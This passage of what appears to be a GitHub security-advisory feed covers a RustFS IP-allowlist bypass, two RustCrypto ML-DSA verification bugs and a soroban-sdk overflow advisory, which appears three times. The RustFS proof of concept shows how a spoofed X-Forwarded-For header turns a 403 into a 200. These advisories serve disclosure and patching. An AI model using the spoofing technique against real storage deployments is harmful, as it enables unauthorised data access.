       /tmp/rustfs-data1 /tmp/rustfs-data2
</code></pre>
<ol start="2">
<li>From <code>rustfs-auth-trusted-ip-header-spoofing-poc</code>/, run:</li>
</ol>
<pre><code>     ENDPOINT=http://127.0.0.1:9000 make run
</code></pre>
<pre><code> The script:
  - Creates bucket `rustfs-trusted-ip-poc`.
  - Applies a bucket policy allowing `s3:ListBucket` only from `10.0.0.5/32` (`Principal: {"AWS":["*"]},` Resource array).
  - Sends three unauthenticated `ListBucket` calls:
      - Baseline (no spoof) → HTTP 403.
      - Spoofed `X-Forwarded-For: 10.0.0.5` → HTTP 200 (policy bypass).
      - Spoofed `X-Forwarded-For: 1.2.3.4` → HTTP 403.
  - Responses saved to `poc-baseline.xml`, `poc-spoofed.xml`, `poc-deny.xml`.
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Vulnerability type: Authorization bypass of IP-allowlist (<code>aws:SourceIp</code>) via header spoofing.</li>
<li>Who is impacted: Any deployment relying on <code>aws:SourceIp</code> in IAM/bucket policies for S3 operations. Attackers with network reach to RustFS can forge forwarded-IP headers to gain list/read/write where IP restrictions were meant to block them.</li>
</ul>
<h3 id="credits">Credits</h3>
<p>Identified by SecMate (<a href="https://secmate.dev">https://secmate.dev</a>) automated analysis and validated during manual triage.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rustfs/rustfs/security/advisories/GHSA-fc6g-2gcp-2qrq">https://github.com/rustfs/rustfs/security/advisories/GHSA-fc6g-2gcp-2qrq</a></li>
<li><a href="https://github.com/rustfs/rustfs/commit/b4ba62fa3300b5b258fdc0da141481e3be7ea960">https://github.com/rustfs/rustfs/commit/b4ba62fa3300b5b258fdc0da141481e3be7ea960</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-21862">https://nvd.nist.gov/vuln/detail/CVE-2026-21862</a></li>
<li><a href="https://github.com/advisories/GHSA-fc6g-2gcp-2qrq">https://github.com/advisories/GHSA-fc6g-2gcp-2qrq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fc6g-2gcp-2qrq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-03T17:31:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ml-dsa] ml-dsa's UseHint function has off by two error when r0 equals zero]]></title>
        <id>https://github.com/advisories/GHSA-h37v-hp6w-2pp8</id>
        <link href="https://github.com/advisories/GHSA-h37v-hp6w-2pp8"/>
        <updated>2026-02-02T20:33:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There's a bug in the <code>use_hint</code> function where it adds 1 instead of subtracting 1 when the decomposed low bits <code>r0</code> equal exactly zero. FIPS 204 Algorithm 40 is pretty clear that <code>r0 &gt; 0</code> means strictly positive, but the current code treats zero as positive. This causes valid signatures to potentially fail verification when this edge case gets hit.</p>
<h3 id="details">Details</h3>
<p>The issue is in <code>ml-dsa/src/hint.rs</code> in the <code>use_hint</code> function. Here's what FIPS 204 Algorithm 40 says:</p>
<pre><code>3: if h = 1 and r0 &gt; 0  return (r1 + 1) mod m
4: if h = 1 and r0 &lt;= 0  return (r1 − 1) mod m
</code></pre>
<p>Line 3 uses <code>r0 &gt; 0</code> (strictly greater than zero), and line 4 uses <code>r0 &lt;= 0</code> (less than or equal, which includes zero). So when <code>r0 = 0</code>, the spec says to subtract 1.</p>
<p>But the current implementation does this:</p>
<pre><code class="language-rust">if h &amp;&amp; r0.0 &lt;= gamma2 {
    Elem::new((r1.0 + 1) % m)
} else if h &amp;&amp; r0.0 &gt;= BaseField::Q - gamma2 {
    Elem::new((r1.0 + m - 1) % m)
}
</code></pre>
<p>The problem is <code>r0.0 &lt;= gamma2</code> includes zero. When <code>r0 = 0</code>, this condition is true (since <code>0 &lt;= gamma2</code>), so it adds 1. But according to the spec, <code>r0 = 0</code> should fall into the <code>r0 &lt;= 0</code> case and subtract 1 instead.</p>
<p>The result is +1 when it should be -1, which is an off by two error mod m.</p>
<h3 id="poc">PoC</h3>
<p>Take MLDSA 44 where γ2 = 95,232 and m = 44.</p>
<p>If <code>use_hint(true, 0)</code> is called:</p>
<ul>
<li><code>Decompose(0)</code> gives <code>(r1=0, r0=0)</code></li>
<li>The condition <code>r0.0 &lt;= gamma2</code> is <code>0 &lt;= 95232</code> which is true</li>
<li>So it returns <code>(0 + 1) % 44 = 1</code></li>
</ul>
<p>But FIPS 204 says:</p>
<ul>
<li><code>r0 &gt; 0</code> is <code>0 &gt; 0</code> which is false</li>
<li><code>r0 ≤ 0</code> is <code>0 ≤ 0</code> which is true</li>
<li>So it should return <code>(0 - 1) mod 44 = 43</code></li>
</ul>
<p>The function returns 1 when it should return 43.</p>
<p>This can happen in real signatures whenever any coefficient of the <code>w'</code> vector happens to be a multiple of 2γ2, which makes its decomposed <code>r0</code> equal zero. It's not super common but it's definitely possible, and when it hits, verification will fail for a completely valid signature.</p>
<h3 id="impact">Impact</h3>
<p>This is a FIPS 204 compliance bug that affects signature verification. When the edge case triggers, valid signatures get rejected. Since MLDSA is supposed to be used for high security post quantum cryptography, having verification randomly fail isn't great. It's also theoretically possible that the mismatch between what signing expects and what verification does could be exploited somehow, though that would need more looking into.</p>
<p>The fix is straightforward, just change the condition to explicitly check for positive values:</p>
<pre><code class="language-rust">if h &amp;&amp; r0.0 &gt; 0 &amp;&amp; r0.0 &lt;= gamma2 {
    Elem::new((r1.0 + 1) % m)
} else if h {
    Elem::new((r1.0 + m - 1) % m)
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/RustCrypto/signatures/security/advisories/GHSA-h37v-hp6w-2pp8">https://github.com/RustCrypto/signatures/security/advisories/GHSA-h37v-hp6w-2pp8</a></li>
<li><a href="https://github.com/RustCrypto/signatures/commit/10f4ff04cb43ef2b789ee06e885f11cd054b1335">https://github.com/RustCrypto/signatures/commit/10f4ff04cb43ef2b789ee06e885f11cd054b1335</a></li>
<li><a href="https://github.com/advisories/GHSA-h37v-hp6w-2pp8">https://github.com/advisories/GHSA-h37v-hp6w-2pp8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h37v-hp6w-2pp8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-02T20:33:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[soroban-sdk] soroban-sdk has overflow in Bytes::slice, Vec::slice, GenRange::gen_range for u64]]></title>
        <id>https://github.com/advisories/GHSA-96xm-fv9w-pf3f</id>
        <link href="https://github.com/advisories/GHSA-96xm-fv9w-pf3f"/>
        <updated>2026-01-29T03:56:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Arithmetic overflow can be triggered in the <code>Bytes::slice</code>, <code>Vec::slice</code>, and <code>Prng::gen_range</code> (for <code>u64</code>) methods in the <code>soroban-sdk</code> in versions prior to and including <code>25.0.1</code>.</p>
<p>Contracts that pass user-controlled or computed range bounds to <code>Bytes::slice</code>, <code>Vec::slice</code>, or <code>Prng::gen_range</code> may silently operate on incorrect data ranges or generate random numbers from an unintended range, potentially resulting in corrupted contract state.</p>
<p>Note that the best practice when using the <code>soroban-sdk</code> and building Soroban contracts is to always enable <code>overflow-checks = true</code>. The <code>stellar contract init</code> tool that prepares the boiler plate for a Soroban contract, as well as all examples and docs, encourage the use of configuring <code>overflow-checks = true</code> on <code>release</code> profiles so that these arithmetic operations fail rather than silently wrap. Contracts are only impacted if they use <code>overflow-checks = false</code> either explicitly or implicitly. It is anticipated the majority of contracts could not be impacted because the best practice encouraged by tooling is to enable <code>overflow-checks</code>.</p>
<h3 id="detail">Detail</h3>
<p>When compiled with <code>overflow-checks = false</code> (the default for release builds), the bare arithmetic in those functions silently wraps on boundary values like <code>u32::MAX</code> or <code>u64::MAX</code>. This causes the range passed to the host to differ from the caller's intent:</p>
<p><code>Bytes::slice</code>:</p>
<ul>
<li><code>Bytes::slice(0..=u32::MAX)</code> — end <code>u32::MAX + 1</code> wraps to <code>0</code>, producing <code>slice(0..0)</code> returning empty instead of the full range.</li>
<li><code>Bytes::slice((Bound::Excluded(u32::MAX), Bound::Unbounded))</code> — start <code>u32::MAX + 1</code> wraps to <code>0</code>, producing <code>slice(0..)</code> instead of an empty/invalid range.</li>
</ul>
<p><code>Vec::slice</code>:</p>
<ul>
<li><code>Vec::slice(0..=u32::MAX)</code> — same as <code>Bytes</code>, end wraps to <code>0</code>, returning empty.</li>
<li><code>Vec::slice((Bound::Excluded(u32::MAX), Bound::Unbounded))</code> — same as <code>Bytes</code>, start wraps to <code>0</code>.</li>
</ul>
<p><code>Prng::gen_range</code>:</p>
<ul>
<li><code>Prng::gen_range((Bound::Unbounded, Bound::Excluded(0)))</code> — end <code>0 - 1</code> wraps to <code>u64::MAX</code>, producing range <code>0..=u64::MAX</code> instead of an empty/invalid range.</li>
<li><code>Prng::gen_range((Bound::Excluded(u64::MAX), Bound::Unbounded))</code> — start <code>u64::MAX + 1</code> wraps to <code>0</code>, producing range <code>0..=u64::MAX</code> instead of an empty/invalid range.</li>
</ul>
<p>Note that some cases where the overflow was permitted and wrapped on the guest side are caught by the Soroban Env Host and cause a trap host side with error <code>HostError: Error(Object, IndexBounds)</code> <code>object index out of bounds</code>, because the wrapped values create invalid inputs:</p>
<ul>
<li><code>Bytes::slice(u32::MAX..=u32::MAX)</code> — both start <code>u32::MAX + 1</code> and end <code>u32::MAX + 1</code> wrap to <code>0</code>, producing <code>slice(0..0)</code>.</li>
<li><code>Vec::slice(u32::MAX..=u32::MAX)</code> — same as <code>Bytes</code>, both wrap to <code>0</code>.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The fix replaces bare arithmetic with <code>checked_add</code> / <code>checked_sub</code>, ensuring overflow traps regardless of the <code>overflow-checks</code> profile setting.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Contract workspaces can be configured with the following profile to enable overflow checks on the arithmetic operations. This is the best practice when developing Soroban contracts, and the default if using the contract boilerplate generated using <code>stellar contract init</code>:</p>
<pre><code class="language-toml">[profile.release]
overflow-checks = true
</code></pre>
<p>Alternatively, contracts can validate range bounds before passing them to <code>slice</code> or <code>gen_range</code> to ensure the conversions cannot overflow:</p>
<ul>
<li>Do not pass <code>Bound::Excluded(u32::MAX)</code> or <code>Bound::Included(u32::MAX)</code> to <code>Bytes::slice</code> or <code>Vec::slice</code>.</li>
<li>Do not pass <code>Bound::Excluded(u64::MAX)</code> as a start bound or <code>Bound::Excluded(0)</code> as an end bound to <code>Prng::gen_range::&lt;u64&gt;</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/stellar/rs-soroban-sdk/pull/1703">https://github.com/stellar/rs-soroban-sdk/pull/1703</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v25.0.2">https://github.com/stellar/rs-soroban-sdk/releases/tag/v25.0.2</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v23.5.1">https://github.com/stellar/rs-soroban-sdk/releases/tag/v23.5.1</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v22.0.9">https://github.com/stellar/rs-soroban-sdk/releases/tag/v22.0.9</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/stellar/rs-soroban-sdk/security/advisories/GHSA-96xm-fv9w-pf3f">https://github.com/stellar/rs-soroban-sdk/security/advisories/GHSA-96xm-fv9w-pf3f</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/commit/3890521426d71bb4d892b21f5a283a1e836cfa38">https://github.com/stellar/rs-soroban-sdk/commit/3890521426d71bb4d892b21f5a283a1e836cfa38</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/commit/59fcef437260ed4da42d1efb357137a5c166c02e">https://github.com/stellar/rs-soroban-sdk/commit/59fcef437260ed4da42d1efb357137a5c166c02e</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/commit/c2757c6d774dbb28b34a0b77ffe282e59f0f8462">https://github.com/stellar/rs-soroban-sdk/commit/c2757c6d774dbb28b34a0b77ffe282e59f0f8462</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v22.0.9">https://github.com/stellar/rs-soroban-sdk/releases/tag/v22.0.9</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v23.5.1">https://github.com/stellar/rs-soroban-sdk/releases/tag/v23.5.1</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v25.0.2">https://github.com/stellar/rs-soroban-sdk/releases/tag/v25.0.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24889">https://nvd.nist.gov/vuln/detail/CVE-2026-24889</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/pull/1703">https://github.com/stellar/rs-soroban-sdk/pull/1703</a></li>
<li><a href="https://github.com/advisories/GHSA-96xm-fv9w-pf3f">https://github.com/advisories/GHSA-96xm-fv9w-pf3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-96xm-fv9w-pf3f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-01-28T22:20:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[soroban-sdk] soroban-sdk has overflow in Bytes::slice, Vec::slice, GenRange::gen_range for u64]]></title>
        <id>https://github.com/advisories/GHSA-96xm-fv9w-pf3f</id>
        <link href="https://github.com/advisories/GHSA-96xm-fv9w-pf3f"/>
        <updated>2026-01-29T03:56:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Arithmetic overflow can be triggered in the <code>Bytes::slice</code>, <code>Vec::slice</code>, and <code>Prng::gen_range</code> (for <code>u64</code>) methods in the <code>soroban-sdk</code> in versions prior to and including <code>25.0.1</code>.</p>
<p>Contracts that pass user-controlled or computed range bounds to <code>Bytes::slice</code>, <code>Vec::slice</code>, or <code>Prng::gen_range</code> may silently operate on incorrect data ranges or generate random numbers from an unintended range, potentially resulting in corrupted contract state.</p>
<p>Note that the best practice when using the <code>soroban-sdk</code> and building Soroban contracts is to always enable <code>overflow-checks = true</code>. The <code>stellar contract init</code> tool that prepares the boiler plate for a Soroban contract, as well as all examples and docs, encourage the use of configuring <code>overflow-checks = true</code> on <code>release</code> profiles so that these arithmetic operations fail rather than silently wrap. Contracts are only impacted if they use <code>overflow-checks = false</code> either explicitly or implicitly. It is anticipated the majority of contracts could not be impacted because the best practice encouraged by tooling is to enable <code>overflow-checks</code>.</p>
<h3 id="detail">Detail</h3>
<p>When compiled with <code>overflow-checks = false</code> (the default for release builds), the bare arithmetic in those functions silently wraps on boundary values like <code>u32::MAX</code> or <code>u64::MAX</code>. This causes the range passed to the host to differ from the caller's intent:</p>
<p><code>Bytes::slice</code>:</p>
<ul>
<li><code>Bytes::slice(0..=u32::MAX)</code> — end <code>u32::MAX + 1</code> wraps to <code>0</code>, producing <code>slice(0..0)</code> returning empty instead of the full range.</li>
<li><code>Bytes::slice((Bound::Excluded(u32::MAX), Bound::Unbounded))</code> — start <code>u32::MAX + 1</code> wraps to <code>0</code>, producing <code>slice(0..)</code> instead of an empty/invalid range.</li>
</ul>
<p><code>Vec::slice</code>:</p>
<ul>
<li><code>Vec::slice(0..=u32::MAX)</code> — same as <code>Bytes</code>, end wraps to <code>0</code>, returning empty.</li>
<li><code>Vec::slice((Bound::Excluded(u32::MAX), Bound::Unbounded))</code> — same as <code>Bytes</code>, start wraps to <code>0</code>.</li>
</ul>
<p><code>Prng::gen_range</code>:</p>
<ul>
<li><code>Prng::gen_range((Bound::Unbounded, Bound::Excluded(0)))</code> — end <code>0 - 1</code> wraps to <code>u64::MAX</code>, producing range <code>0..=u64::MAX</code> instead of an empty/invalid range.</li>
<li><code>Prng::gen_range((Bound::Excluded(u64::MAX), Bound::Unbounded))</code> — start <code>u64::MAX + 1</code> wraps to <code>0</code>, producing range <code>0..=u64::MAX</code> instead of an empty/invalid range.</li>
</ul>
<p>Note that some cases where the overflow was permitted and wrapped on the guest side are caught by the Soroban Env Host and cause a trap host side with error <code>HostError: Error(Object, IndexBounds)</code> <code>object index out of bounds</code>, because the wrapped values create invalid inputs:</p>
<ul>
<li><code>Bytes::slice(u32::MAX..=u32::MAX)</code> — both start <code>u32::MAX + 1</code> and end <code>u32::MAX + 1</code> wrap to <code>0</code>, producing <code>slice(0..0)</code>.</li>
<li><code>Vec::slice(u32::MAX..=u32::MAX)</code> — same as <code>Bytes</code>, both wrap to <code>0</code>.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The fix replaces bare arithmetic with <code>checked_add</code> / <code>checked_sub</code>, ensuring overflow traps regardless of the <code>overflow-checks</code> profile setting.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Contract workspaces can be configured with the following profile to enable overflow checks on the arithmetic operations. This is the best practice when developing Soroban contracts, and the default if using the contract boilerplate generated using <code>stellar contract init</code>:</p>
<pre><code class="language-toml">[profile.release]
overflow-checks = true
</code></pre>
<p>Alternatively, contracts can validate range bounds before passing them to <code>slice</code> or <code>gen_range</code> to ensure the conversions cannot overflow:</p>
<ul>
<li>Do not pass <code>Bound::Excluded(u32::MAX)</code> or <code>Bound::Included(u32::MAX)</code> to <code>Bytes::slice</code> or <code>Vec::slice</code>.</li>
<li>Do not pass <code>Bound::Excluded(u64::MAX)</code> as a start bound or <code>Bound::Excluded(0)</code> as an end bound to <code>Prng::gen_range::&lt;u64&gt;</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/stellar/rs-soroban-sdk/pull/1703">https://github.com/stellar/rs-soroban-sdk/pull/1703</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v25.0.2">https://github.com/stellar/rs-soroban-sdk/releases/tag/v25.0.2</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v23.5.1">https://github.com/stellar/rs-soroban-sdk/releases/tag/v23.5.1</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v22.0.9">https://github.com/stellar/rs-soroban-sdk/releases/tag/v22.0.9</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/stellar/rs-soroban-sdk/security/advisories/GHSA-96xm-fv9w-pf3f">https://github.com/stellar/rs-soroban-sdk/security/advisories/GHSA-96xm-fv9w-pf3f</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/commit/3890521426d71bb4d892b21f5a283a1e836cfa38">https://github.com/stellar/rs-soroban-sdk/commit/3890521426d71bb4d892b21f5a283a1e836cfa38</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/commit/59fcef437260ed4da42d1efb357137a5c166c02e">https://github.com/stellar/rs-soroban-sdk/commit/59fcef437260ed4da42d1efb357137a5c166c02e</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/commit/c2757c6d774dbb28b34a0b77ffe282e59f0f8462">https://github.com/stellar/rs-soroban-sdk/commit/c2757c6d774dbb28b34a0b77ffe282e59f0f8462</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v22.0.9">https://github.com/stellar/rs-soroban-sdk/releases/tag/v22.0.9</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v23.5.1">https://github.com/stellar/rs-soroban-sdk/releases/tag/v23.5.1</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v25.0.2">https://github.com/stellar/rs-soroban-sdk/releases/tag/v25.0.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24889">https://nvd.nist.gov/vuln/detail/CVE-2026-24889</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/pull/1703">https://github.com/stellar/rs-soroban-sdk/pull/1703</a></li>
<li><a href="https://github.com/advisories/GHSA-96xm-fv9w-pf3f">https://github.com/advisories/GHSA-96xm-fv9w-pf3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-96xm-fv9w-pf3f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-01-28T22:20:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[soroban-sdk] soroban-sdk has overflow in Bytes::slice, Vec::slice, GenRange::gen_range for u64]]></title>
        <id>https://github.com/advisories/GHSA-96xm-fv9w-pf3f</id>
        <link href="https://github.com/advisories/GHSA-96xm-fv9w-pf3f"/>
        <updated>2026-01-29T03:56:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Arithmetic overflow can be triggered in the <code>Bytes::slice</code>, <code>Vec::slice</code>, and <code>Prng::gen_range</code> (for <code>u64</code>) methods in the <code>soroban-sdk</code> in versions prior to and including <code>25.0.1</code>.</p>
<p>Contracts that pass user-controlled or computed range bounds to <code>Bytes::slice</code>, <code>Vec::slice</code>, or <code>Prng::gen_range</code> may silently operate on incorrect data ranges or generate random numbers from an unintended range, potentially resulting in corrupted contract state.</p>
<p>Note that the best practice when using the <code>soroban-sdk</code> and building Soroban contracts is to always enable <code>overflow-checks = true</code>. The <code>stellar contract init</code> tool that prepares the boiler plate for a Soroban contract, as well as all examples and docs, encourage the use of configuring <code>overflow-checks = true</code> on <code>release</code> profiles so that these arithmetic operations fail rather than silently wrap. Contracts are only impacted if they use <code>overflow-checks = false</code> either explicitly or implicitly. It is anticipated the majority of contracts could not be impacted because the best practice encouraged by tooling is to enable <code>overflow-checks</code>.</p>
<h3 id="detail">Detail</h3>
<p>When compiled with <code>overflow-checks = false</code> (the default for release builds), the bare arithmetic in those functions silently wraps on boundary values like <code>u32::MAX</code> or <code>u64::MAX</code>. This causes the range passed to the host to differ from the caller's intent:</p>
<p><code>Bytes::slice</code>:</p>
<ul>
<li><code>Bytes::slice(0..=u32::MAX)</code> — end <code>u32::MAX + 1</code> wraps to <code>0</code>, producing <code>slice(0..0)</code> returning empty instead of the full range.</li>
<li><code>Bytes::slice((Bound::Excluded(u32::MAX), Bound::Unbounded))</code> — start <code>u32::MAX + 1</code> wraps to <code>0</code>, producing <code>slice(0..)</code> instead of an empty/invalid range.</li>
</ul>
<p><code>Vec::slice</code>:</p>
<ul>
<li><code>Vec::slice(0..=u32::MAX)</code> — same as <code>Bytes</code>, end wraps to <code>0</code>, returning empty.</li>
<li><code>Vec::slice((Bound::Excluded(u32::MAX), Bound::Unbounded))</code> — same as <code>Bytes</code>, start wraps to <code>0</code>.</li>
</ul>
<p><code>Prng::gen_range</code>:</p>
<ul>
<li><code>Prng::gen_range((Bound::Unbounded, Bound::Excluded(0)))</code> — end <code>0 - 1</code> wraps to <code>u64::MAX</code>, producing range <code>0..=u64::MAX</code> instead of an empty/invalid range.</li>
<li><code>Prng::gen_range((Bound::Excluded(u64::MAX), Bound::Unbounded))</code> — start <code>u64::MAX + 1</code> wraps to <code>0</code>, producing range <code>0..=u64::MAX</code> instead of an empty/invalid range.</li>
</ul>
<p>Note that some cases where the overflow was permitted and wrapped on the guest side are caught by the Soroban Env Host and cause a trap host side with error <code>HostError: Error(Object, IndexBounds)</code> <code>object index out of bounds</code>, because the wrapped values create invalid inputs:</p>
<ul>
<li><code>Bytes::slice(u32::MAX..=u32::MAX)</code> — both start <code>u32::MAX + 1</code> and end <code>u32::MAX + 1</code> wrap to <code>0</code>, producing <code>slice(0..0)</code>.</li>
<li><code>Vec::slice(u32::MAX..=u32::MAX)</code> — same as <code>Bytes</code>, both wrap to <code>0</code>.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The fix replaces bare arithmetic with <code>checked_add</code> / <code>checked_sub</code>, ensuring overflow traps regardless of the <code>overflow-checks</code> profile setting.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Contract workspaces can be configured with the following profile to enable overflow checks on the arithmetic operations. This is the best practice when developing Soroban contracts, and the default if using the contract boilerplate generated using <code>stellar contract init</code>:</p>
<pre><code class="language-toml">[profile.release]
overflow-checks = true
</code></pre>
<p>Alternatively, contracts can validate range bounds before passing them to <code>slice</code> or <code>gen_range</code> to ensure the conversions cannot overflow:</p>
<ul>
<li>Do not pass <code>Bound::Excluded(u32::MAX)</code> or <code>Bound::Included(u32::MAX)</code> to <code>Bytes::slice</code> or <code>Vec::slice</code>.</li>
<li>Do not pass <code>Bound::Excluded(u64::MAX)</code> as a start bound or <code>Bound::Excluded(0)</code> as an end bound to <code>Prng::gen_range::&lt;u64&gt;</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/stellar/rs-soroban-sdk/pull/1703">https://github.com/stellar/rs-soroban-sdk/pull/1703</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v25.0.2">https://github.com/stellar/rs-soroban-sdk/releases/tag/v25.0.2</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v23.5.1">https://github.com/stellar/rs-soroban-sdk/releases/tag/v23.5.1</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v22.0.9">https://github.com/stellar/rs-soroban-sdk/releases/tag/v22.0.9</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/stellar/rs-soroban-sdk/security/advisories/GHSA-96xm-fv9w-pf3f">https://github.com/stellar/rs-soroban-sdk/security/advisories/GHSA-96xm-fv9w-pf3f</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/commit/3890521426d71bb4d892b21f5a283a1e836cfa38">https://github.com/stellar/rs-soroban-sdk/commit/3890521426d71bb4d892b21f5a283a1e836cfa38</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/commit/59fcef437260ed4da42d1efb357137a5c166c02e">https://github.com/stellar/rs-soroban-sdk/commit/59fcef437260ed4da42d1efb357137a5c166c02e</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/commit/c2757c6d774dbb28b34a0b77ffe282e59f0f8462">https://github.com/stellar/rs-soroban-sdk/commit/c2757c6d774dbb28b34a0b77ffe282e59f0f8462</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v22.0.9">https://github.com/stellar/rs-soroban-sdk/releases/tag/v22.0.9</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v23.5.1">https://github.com/stellar/rs-soroban-sdk/releases/tag/v23.5.1</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/releases/tag/v25.0.2">https://github.com/stellar/rs-soroban-sdk/releases/tag/v25.0.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24889">https://nvd.nist.gov/vuln/detail/CVE-2026-24889</a></li>
<li><a href="https://github.com/stellar/rs-soroban-sdk/pull/1703">https://github.com/stellar/rs-soroban-sdk/pull/1703</a></li>
<li><a href="https://github.com/advisories/GHSA-96xm-fv9w-pf3f">https://github.com/advisories/GHSA-96xm-fv9w-pf3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-96xm-fv9w-pf3f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-01-28T22:20:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ml-dsa] ML-DSA Signature Verification Accepts Signatures with Repeated Hint Indices]]></title>
        <id>https://github.com/advisories/GHSA-5x2r-hc65-25f9</id>
        <link href="https://github.com/advisories/GHSA-5x2r-hc65-25f9"/>
        <updated>2026-01-28T16:44:49.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Affected Crate:</strong> <code>ml-dsa</code><br><strong>Affected Versions:</strong> v0.1.0-rc.2 (and commits since <code>b01c3b7</code>)<br><strong>Severity:</strong> Medium<br><strong>Reporter:</strong> Oren Yomtov (Fireblocks)</p>
<h2 id="summary">Summary</h2>
<p>The ML-DSA signature verification implementation in the RustCrypto <code>ml-dsa</code> crate incorrectly accepts signatures with repeated (duplicate) hint indices. According to the ML-DSA specification (FIPS 204 / RFC 9881), hint indices within each polynomial must be <strong>strictly increasing</strong>. The current implementation uses a non-strict monotonic check (<code>&lt;=</code> instead of <code>&lt;</code>), allowing duplicate indices.</p>
<p><strong>Note:</strong> This is a regression bug. The original implementation was correct, but commit <code>b01c3b7</code> ("Make ML-DSA signature decoding follow the spec (#895)", fixing issue #894) inadvertently changed the strict <code>&lt;</code> comparison to <code>&lt;=</code>, introducing the vulnerability.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<h3 id="root-cause">Root Cause</h3>
<p>The vulnerability is located in the <code>monotonic</code> helper function in <code>ml-dsa/src/hint.rs</code>:</p>
<pre><code class="language-rust">fn monotonic(a: &amp;[usize]) -&gt; bool {
    a.iter().enumerate().all(|(i, x)| i == 0 || a[i - 1] &lt;= *x)
}
</code></pre>
<p>The comparison operator <code>&lt;=</code> allows equal consecutive values, meaning duplicate hint indices are not rejected. The correct implementation should use strict less-than (<code>&lt;</code>):</p>
<pre><code class="language-rust">fn monotonic(a: &amp;[usize]) -&gt; bool {
    a.iter().enumerate().all(|(i, x)| i == 0 || a[i - 1] &lt; *x)
}
</code></pre>
<h3 id="regression-analysis">Regression Analysis</h3>
<ul>
<li><strong>Original correct code</strong> (commit <code>1d3a1d1</code> - "Add support for ML-DSA (#877)"): Used <code>&lt;</code> (strict)</li>
